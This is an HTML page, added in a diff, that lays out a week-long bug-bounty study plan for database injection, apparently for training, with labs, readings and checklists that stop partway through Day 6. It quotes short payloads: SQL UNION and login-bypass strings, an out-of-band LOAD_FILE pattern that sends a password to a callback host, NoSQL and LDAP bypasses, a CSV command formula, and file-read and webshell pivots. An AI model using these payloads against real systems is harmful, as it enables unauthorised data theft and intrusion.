@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Week 06 — DB Injection ULTIMATE · sayed_</title>
+<meta name="theme-color" content="#0c0d10">
+<link rel="icon" href="assets/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="assets/favicon-16.png">
+<link rel="apple-touch-icon" sizes="180x180" href="assets/favicon-192.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/plan.css">
+</head>
+<body data-week="06" data-wk="bbv2-06">
+<nav class="site-nav"><div class="inner">
+<a class="brand" href="index.html"><span class="logo-wrap"><span class="logo-orbit" aria-hidden="true"><i></i><i></i><i></i></span><img class="logo" src="/logo/logo.png" alt="sayed logo"></span><span class="mark">&gt;</span> sayed<span class="mark">_</span></a>
+<div class="nav-links">
+<a href="/index.html">Posts</a>
+<a href="/about.html">About</a>
+<a href="/keendork/keendork.html">Dorks</a>
+<a href="/bugbounty-plan/index.html">Plan</a>
+<a href="week05_client.html">← Prev</a><a class="current" href="week06_db.html">W06</a><a href="week07_server.html">Next →</a>
+</div>
+<div class="weekprog"><span id="pct">0%</span><div class="bar"><i id="bar"></i></div><button class="navbtn" id="expandBtn" onclick="toggleExpandAll()">Expand</button><button class="navbtn" onclick="resetWeek()">Reset</button></div>
+</div></nav>
+<main class="main"><div class="wrap">
+<header class="hero">
+<p class="kicker">Week 06 · DB Injection ULTIMATE · 7 days × 180 min</p>
+<h1>UNION to blind, manual first, SELECT-only on live.</h1>
+<p class="lede">Error → UNION → blind/time/OOB → WAF bypass → NoSQL/LDAP/ORM → CSV/XPath/XSLT → RCE pivots. sqlmap <code>--batch --risk=1 --level=1 --delay</code>, never DROP/DELETE. Dump = critical, stop + report.</p>
+<div class="pills"><span class="tag tag--accent">SELECT-only live</span><span class="tag">baseline every blind</span><span class="tag">ticks bbv2-06</span></div>
+</header>
+<div class="done-banner" id="doneBanner">🎉 Week complete — all boxes ticked. Move to Week 07.</div>
+
+<div class="day" id="day-1" data-day="1">
+<button class="day-head" onclick="toggleDay('day-1')"><span>Day 1 — SQLi error + UNION (reads you can prove)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-1">
+<div class="timer">Real 180 min · 500 + SQL error = critical signal</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> UNION steps cold: count → types → dump</p>
+<p class="t-act">Write <code>' → ORDER BY → UNION SELECT NULL... → database(),user() → tables → dump</code>. Read <b>PortSwigger SQLi topic § UNION steps ONLY</b> + <b>WSTG SQLi § objectives ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: UNION steps</a><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" target="_blank" rel="noopener">WSTG: SQLi</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Steps + error shapes (MySQL/Oracle/SQLite/MSSQL) cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Login-bypass → UNION labs + error map (lab)</p>
+<p class="t-act">Do <b>PortSwigger login-bypass (<code>' OR 1=1--</code>) → UNION labs IN ORDER</b> + <b>THM sqlinjectionintroduction Task 5 (auth-bypass) + Task 9 L1 (UNION sqli_one) ONLY</b>. Map error strings per DBMS. YT: <code>IppSec SQL injection UNION blind HackTheBox</code>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener">Lab: login bypass first</a><a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener">Lab: retrieve hidden data</a><a href="https://portswigger.net/web-security/all-labs#sql-injection" target="_blank" rel="noopener">All labs: SQLi filter</a><a href="https://tryhackme.com/room/sqlinjectionintroduction" target="_blank" rel="noopener">THM: sqli T5+T9L1</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener">PATT: UNION rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Error map + UNION dump (lab) + column-count method.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Grab $4.5k UNION-dump critical + 1 full-dump case</p>
+<p class="t-act">Read <b>H1 #312327 Grab SQLi (quote-break → ORDER BY → UNION database(),user() → tables dump) FULL chain</b> + <b>1 UNION full-dump critical (search <code>SQL injection bounty $ min_faves:100</code>) — dump-proof redaction ONLY</b>.</p>
+<div class="t-links"><a href="https://hackerone.com/reports/312327" target="_blank" rel="noopener">H1 #312327 Grab $4.5k</a><a href="https://github.com/ashikkunjumon/HackerOne-Disclosed-Reports-Payloads" target="_blank" rel="noopener">H1: SQLi payloads</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Surprise</h4><p>Grab chain = BSCP stage-1 pattern: bypass → UNION → creds → login reuse. Learn it here, reuse Week 07.</p><h4>Done-when</h4><p>2 chains with break→count→dump steps.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Error-string map + FuzzDB/SecLists primitives</p>
+<p class="t-act">Consolidate MySQL/Oracle/SQLite/MSSQL errors + <b>FuzzDB sqli/MySQL.txt + SecLists quick-SQLi.txt paths ONLY</b>.</p>
+<div class="t-links"><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">FuzzDB: sqli</a><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi" target="_blank" rel="noopener">SecLists: SQLi fuzz</a><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" rel="noopener">HackTricks: error rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Map + primitive list saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> UNION steps test + gaps</p>
+<p class="t-act">Recite cold. Note WAF hits for Day 3. Triage gaps.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d1c0"><label for="w06d1c0"><b>0:00–0:15</b> — UNION steps + errors</label></li>
+<li><input type="checkbox" id="w06d1c1"><label for="w06d1c1"><b>0:15–1:05</b> — bypass + UNION labs + map</label></li>
+<li><input type="checkbox" id="w06d1c2"><label for="w06d1c2"><b>1:05–2:00</b> — Grab $4.5k + dump case</label></li>
+<li><input type="checkbox" id="w06d1c3"><label for="w06d1c3"><b>2:00–2:35</b> — error map + primitives</label></li>
+<li><input type="checkbox" id="w06d1c4"><label for="w06d1c4"><b>2:35–3:00</b> — steps recited + gaps</label></li>
+<li><input type="checkbox" id="w06d1c5"><label for="w06d1c5"><b>Proof</b> — map + lab dump archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Quote-break first, dump second.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('1')">📋 Copy day</button><button class="btn" onclick="openDayLinks('1')">🔗 Open links</button><button class="btn" onclick="resetDay('1')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-2" data-day="2">
+<button class="day-head" onclick="toggleDay('day-2')"><span>Day 2 — Blind / time / OOB + second-order</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-2">
+<div class="timer">Real 180 min · blind needs baseline timing</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Boolean vs time vs OOB vs second-order triggers</p>
+<p class="t-act">Write triggers + <code>SUBSTR/SLEEP(5)/LOAD_FILE/Collaborator</code> shapes. Read <b>PortSwigger blind/time § baseline concept ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: blind/time</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>4 triggers + functions cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Blind/time labs + baseline + OOB via Collaborator (lab)</p>
+<p class="t-act">Do <b>PortSwigger blind + time labs (record baseline ms first) + THM sqlinjectionintroduction Task 6 (boolean/time) + Task 7 (OOB LOAD_FILE DNS) ONLY</b>. OOB: <b><code>LOAD_FILE(CONCAT('\\\\',(SELECT password),'CB.oast.fun\\a'))</code> pattern, lab ONLY</b>. YT: <code>LiveOverflow second order SQL injection</code> preview.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/all-labs#sql-injection" target="_blank" rel="noopener">All labs: blind/time/OOB filter</a><a href="https://tryhackme.com/room/sqlinjectionintroduction" target="_blank" rel="noopener">THM: boolean/time/OOB</a><a href="https://ctf.hacker101.com/" target="_blank" rel="noopener">Hacker101 CTF: SQLi flags (free)</a><a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noopener">interactsh OOB</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Baseline table + boolean/time/OOB proofs (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Blind→dump + OOB-exfil + second-order cases</p>
+<p class="t-act">Read <b>H1 #304083 Shopify blind + 1 OOB-exfil (DNS/HTTP callback) — char-by-char vs callback ONLY</b> + <b>1 second-order (store now, trigger on re-login/admin view) summary</b>.</p>
+<div class="t-links"><a href="https://hackerone.com/reports/304083" target="_blank" rel="noopener">H1 #304083 Shopify blind</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: OOB/second-order</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 patterns with proof shapes.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Blind matrix + sqlmap/ghauri careful flags (lab)</p>
+<p class="t-act">Matrix: baseline/threshold/confirm. <b><code>sqlmap --batch --risk=1 --level=1 --technique=BEUST --delay=1</code> + <code>ghauri --batch --level=1</code> on LAB ONLY</b>. <b>THM sqlmapthebasics Task 2–3 (detect/automation) ONLY</b>.</p>
+<div class="t-links"><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">sqlmap safe flags</a><a href="https://github.com/dark-lbp/ghauri" target="_blank" rel="noopener">ghauri batch</a><a href="https://tryhackme.com/room/sqlmapthebasics" target="_blank" rel="noopener">THM: sqlmap T2–3</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Common mistake</h4><p><code>--risk=3 --level=5</code> on live. CUT — safe flags + manual first, tool second.</p><h4>Done-when</h4><p>Matrix + 1 safe tool log (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> OOB-mandatory test + gaps</p>
+<p class="t-act">State when OOB beats time. Triage gaps (WAF next).</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" rel="noopener">HackTricks: OOB rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + matrix archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d2c0"><label for="w06d2c0"><b>0:00–0:15</b> — 4 triggers + functions</label></li>
+<li><input type="checkbox" id="w06d2c1"><label for="w06d2c1"><b>0:15–1:05</b> — baseline + 3 proofs (lab)</label></li>
+<li><input type="checkbox" id="w06d2c2"><label for="w06d2c2"><b>1:05–2:00</b> — 3 patterns (blind/OOB/2nd)</label></li>
+<li><input type="checkbox" id="w06d2c3"><label for="w06d2c3"><b>2:00–2:35</b> — matrix + safe tool log</label></li>
+<li><input type="checkbox" id="w06d2c4"><label for="w06d2c4"><b>2:35–3:00</b> — OOB rule + gaps</label></li>
+<li><input type="checkbox" id="w06d2c5"><label for="w06d2c5"><b>Proof</b> — matrix + proofs archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> No baseline = no blind claim.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('2')">📋 Copy day</button><button class="btn" onclick="openDayLinks('2')">🔗 Open links</button><button class="btn" onclick="resetDay('2')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-3" data-day="3">
+<button class="day-head" onclick="toggleDay('day-3')"><span>Day 3 — WAF bypass + creds → access (BSCP stage-1)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-3">
+<div class="timer">Real 180 min · adapt attacks, don't quit on WAF</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Bypass primitives: case/comment/encode/stacked</p>
+<p class="t-act">List + 1 example each. Read <b>PortSwigger filter-bypass labs intro § ONLY</b> + <b>BSCP exam hints § obfuscation ONLY</b>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: filter bypass</a><a href="https://portswigger.net/web-security/certification/exam-hints-and-guidance" target="_blank" rel="noopener">BSCP: obfuscation hints</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>4 primitives + 1 example each.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Filter-bypass labs + creds → login reuse (lab)</p>
+<p class="t-act">Do <b>PortSwigger encoding/case/comment labs + THM advancedsqlinjection (error/UNION/blind/second-order/WAF-encode) ONLY</b>. Extract creds → reuse login (BSCP stage-1). <b>Manual extraction first (guessable tables/columns), sqlmap second.</b> YT: <code>STOK SQLmap bug bounty $4500</code>.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: bypass labs</a><a href="https://tryhackme.com/room/advancedsqlinjection" target="_blank" rel="noopener">THM: advanced sqli</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Bypass table (primitive × DBMS × result) + login reuse.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> WAF-bypass thread + cred-reuse access case</p>
+<p class="t-act">Read <b>1 WAF-bypass discussion (XSS/SQLi thread, search <code>SQL injection bounty $ min_faves:100</code>) + 1 cred-reuse access report — bypassed rule + reused cred ONLY</b>.</p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener">PATT: bypass rows</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: cred reuse</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 rules + reuse note.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Bypass table + SecLists encoding drills</p>
+<p class="t-act">Consolidate + drill <b>SecLists SQLi quick list 10 lines on lab param (one at a time, observe diff)</b>.</p>
+<div class="t-links"><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi" target="_blank" rel="noopener">SecLists: 10-line drill</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Table + drill log.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> 3 bypasses cold + gaps</p>
+<p class="t-act">Explain 3 with DBMS context. Triage gaps (NoSQL next).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + table archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d3c0"><label for="w06d3c0"><b>0:00–0:15</b> — 4 primitives + examples</label></li>
+<li><input type="checkbox" id="w06d3c1"><label for="w06d3c1"><b>0:15–1:05</b> — bypass labs + login reuse</label></li>
+<li><input type="checkbox" id="w06d3c2"><label for="w06d3c2"><b>1:05–2:00</b> — 2 bypass/reuse rules</label></li>
+<li><input type="checkbox" id="w06d3c3"><label for="w06d3c3"><b>2:00–2:35</b> — table + 10-line drill</label></li>
+<li><input type="checkbox" id="w06d3c4"><label for="w06d3c4"><b>2:35–3:00</b> — 3 bypasses + gaps</label></li>
+<li><input type="checkbox" id="w06d3c5"><label for="w06d3c5"><b>Proof</b> — table + reuse archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Bypass is adaptation, not luck.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('3')">📋 Copy day</button><button class="btn" onclick="openDayLinks('3')">🔗 Open links</button><button class="btn" onclick="resetDay('3')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-4" data-day="4">
+<button class="day-head" onclick="toggleDay('day-4')"><span>Day 4 — NoSQL / LDAP / ORM (backend dictates payload)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-4">
+<div class="timer">Real 180 min · operators beat quotes here</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> $ne/$gt + LDAP filter + ORM idea</p>
+<p class="t-act">Write <code>{"user":{"$ne":null}}</code> + <code>*) (uid=*))(|(uid=*</code> + ORM f-string risk. Read <b>HackTricks NoSQL § operator table + LDAP § filter shape ONLY</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection" target="_blank" rel="noopener">HackTricks: NoSQL ops</a><a href="https://book.hacktricks.xyz/pentesting-web/ldap-injection" target="_blank" rel="noopener">HackTricks: LDAP filter</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 shapes + 1 example each.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> NoSQL + LDAP labs: operator bypass + blind extract (lab)</p>
+<p class="t-act">Do <b>PortSwigger NoSQL labs (Express/Mongo) + THM nosqlinjection (login bypass, enum, exfil) + THM ldapinjection Task 4–7 (fundamentals, bypass, blind, automation) ONLY</b>. Test type-juggling (string vs object) + <code>$regex</code> char extract (lab).</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noopener">PortSwigger: NoSQL labs</a><a href="https://portswigger.net/web-security/all-labs#nosql-injection" target="_blank" rel="noopener">All labs: NoSQL filter</a><a href="https://tryhackme.com/room/nosqlinjection" target="_blank" rel="noopener">THM: nosql ($ne/$regex)</a><a href="https://tryhackme.com/room/ldapinjection" target="_blank" rel="noopener">THM: ldap T4–7</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>YT/X</h4><p>YT: <code>John Hammond NoSQL injection $ne bypass</code>. X: <code>NoSQL $ne auth bypass HackerOne</code>.</p><h4>Done-when</h4><p>Bypass + 1 blind extract (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Mongo auth-bypass + ORM-injection cases</p>
+<p class="t-act">Read <b>1 Mongo <code>$ne</code> login-bypass + 1 ORM (HQL/SQLAlchemy concat) — injected operator/field ONLY</b>.</p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank" rel="noopener">PATT: NoSQL ops</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: ORM case</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 operator/field notes.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Operator + LDAP + ORM-weak-vs-vuln table</p>
+<p class="t-act">Consolidate + note weak (string concat) vs vulnerable (proven bypass) ORM points.</p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" target="_blank" rel="noopener">PATT: LDAP rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Table saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> $ne trick test + gaps</p>
+<p class="t-act">Explain <code>$ne:null</code> auth bypass end-to-end. Triage gaps.</p>
+<div class="t-links"><a href="https://portswigger.net/web-security/nosql-injection" target="_blank" rel="noopener">PortSwigger: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + table archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d4c0"><label for="w06d4c0"><b>0:00–0:15</b> — 3 shapes + examples</label></li>
+<li><input type="checkbox" id="w06d4c1"><label for="w06d4c1"><b>0:15–1:05</b> — bypass + blind extract (lab)</label></li>
+<li><input type="checkbox" id="w06d4c2"><label for="w06d4c2"><b>1:05–2:00</b> — 2 operator/field notes</label></li>
+<li><input type="checkbox" id="w06d4c3"><label for="w06d4c3"><b>2:00–2:35</b> — operator table</label></li>
+<li><input type="checkbox" id="w06d4c4"><label for="w06d4c4"><b>2:35–3:00</b> — $ne recited + gaps</label></li>
+<li><input type="checkbox" id="w06d4c5"><label for="w06d4c5"><b>Proof</b> — table + lab shots archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Content-Type tells operator language.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('4')">📋 Copy day</button><button class="btn" onclick="openDayLinks('4')">🔗 Open links</button><button class="btn" onclick="resetDay('4')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-5" data-day="5">
+<button class="day-head" onclick="toggleDay('day-5')"><span>Day 5 — CSV / XPath / XSLT (export sinks)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-5">
+<div class="timer">Real 180 min · export = injection sink</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> CSV prefixes + XPath shape + XSLT code-exec idea</p>
+<p class="t-act">List <code>= + - @</code> + <code>//user[pass='$input']</code> + <code>xsl:value-of</code> exec. Read <b>OWASP CSV Injection § payload rows ONLY</b> + <b>WSTG CSV § objectives ONLY</b>.</p>
+<div class="t-links"><a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noopener">OWASP: CSV rows</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" target="_blank" rel="noopener">PATT: XSLT rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 shapes + 1 example each.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> CSV formula + XPath bypass drills (lab)</p>
+<p class="t-act">Test <b><code>=cmd|' /C calc'!A0 + =HYPERLINK</code> in lab export + download to confirm (no victim send)</b> + <b>XPath <code>' or '1'='1</code> login-bypass drill (lab)</b>. XSLT RCE theory only.</p>
+<div class="t-links"><a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noopener">OWASP: CSV drill</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" target="_blank" rel="noopener">PATT: XSLT theory</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>H1</h4><p>H1 #244292 Grab CSV <code>=cmd|' /C calc'!A0</code> — customer-name field → Excel open. Extract formula + trigger app.</p><h4>Done-when</h4><p>Formula + bypass logged (lab download).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Grab CSV + XSLT-RCE note</p>
+<p class="t-act">Read <b>H1 #244292 Grab CSV (<code>=cmd|' /C calc'!A0</code> customer name → Excel) FULL + 1 XSLT code-exec note — sink ONLY</b>.</p>
+<div class="t-links"><a href="https://hackerone.com/reports/244292" target="_blank" rel="noopener">H1 #244292 Grab CSV</a><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection" target="_blank" rel="noopener">PATT: XSLT sink</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 sink notes with trigger.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Export-sink list + impact triage</p>
+<p class="t-act">List exports (CSV/PDF/XLS/XML) × formula/XPath/XSLT × who opens. Triage: victim-opened = pay.</p>
+<div class="t-links"><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" target="_blank" rel="noopener">WSTG: input validation index</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Sink list + triage saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> CSV risk test + gaps</p>
+<p class="t-act">Explain formula + DDE risk in 3 lines. Triage gaps (RCE pivots next).</p>
+<div class="t-links"><a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noopener">OWASP: re-check</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + list archived.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d5c0"><label for="w06d5c0"><b>0:00–0:15</b> — 3 shapes + examples</label></li>
+<li><input type="checkbox" id="w06d5c1"><label for="w06d5c1"><b>0:15–1:05</b> — formula + XPath (lab)</label></li>
+<li><input type="checkbox" id="w06d5c2"><label for="w06d5c2"><b>1:05–2:00</b> — Grab CSV + XSLT notes</label></li>
+<li><input type="checkbox" id="w06d5c3"><label for="w06d5c3"><b>2:00–2:35</b> — sink list + triage</label></li>
+<li><input type="checkbox" id="w06d5c4"><label for="w06d5c4"><b>2:35–3:00</b> — risk recited + gaps</label></li>
+<li><input type="checkbox" id="w06d5c5"><label for="w06d5c5"><b>Proof</b> — list + lab shots archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Downloaded file = executed file.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('5')">📋 Copy day</button><button class="btn" onclick="openDayLinks('5')">🔗 Open links</button><button class="btn" onclick="resetDay('5')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-6" data-day="6">
+<button class="day-head" onclick="toggleDay('day-6')"><span>Day 6 — DB → RCE / SSRF pivots (stop-and-report)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-6">
+<div class="timer">Real 180 min · dump = critical, RCE = stop + 24h report</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> OUTFILE / FILE READ / stacked preconditions</p>
+<p class="t-act">List <code>INTO OUTFILE</code> (write priv + path) + <code>LOAD_FILE</code> (read priv) + stacked <code>;</code> (driver). Read <b>HackTricks SQLi § file-read/OUTFILE rows ONLY</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" rel="noopener">HackTricks: OUTFILE rows</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>3 preconditions cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> FILE READ proof + write-blocked check (lab only)</p>
+<p class="t-act">Prove <b><code>LOAD_FILE('/etc/hostname')</code> read on lab</b>. Check OUTFILE blocked (priv/path). Note SSRF-via-SQL (<code>LOAD_FILE + INTO DUMPFILE</code> URL fetch) theory. <b>Never webshell prod.</b></p>
+<div class="t-links"><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">PortSwigger: file-read labs</a><a href="https://portswigger.net/web-security/ssrf" target="_blank" rel="noopener">PortSwigger: SSRF pivot preview</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Read proof + blocked-check logged (lab).</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> SQLi→RCE chain + DB-cred cloud pivot</p>
+<p class="t-act">Read <b>1 SQLi→RCE (OUTFILE webshell / xp_cmdshell pattern) + 1 DB-cred → cloud (RDS keys in JS/env → s3 ls) — pivot step ONLY each</b>.</p>
+<div class="t-links"><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" rel="noopener">HackTricks: RCE chains</a><a href="https://pentester.land/writeups" target="_blank" rel="noopener">pentester.land: cloud pivot</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Surprise</h4><p>DB creds are cloud creds. JS/env RDS keys compose with Week 02 secrets + Week 11 IAM.</p><h4>Done-when</h4><p>2 pivot diagrams.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> Chain map + severity + 24h rule card</p>
+<p class="t-act">Map read→write→RCE→cloud. Score dump vs RCE. Write 24h-report rule.</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: severity + report</a><a href="https://www.first.org/cvss/calculator/3.1" target="_blank" rel="noopener">CVSS: RCE vector</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Map + vectors + rule card.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Chain impact + stop rule test + gaps</p>
+<p class="t-act">Recite stop rule. Triage gaps (live sweep next).</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: stop rule</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + map archived.</p></details></li>
+</ol>
+<ul class="chk">
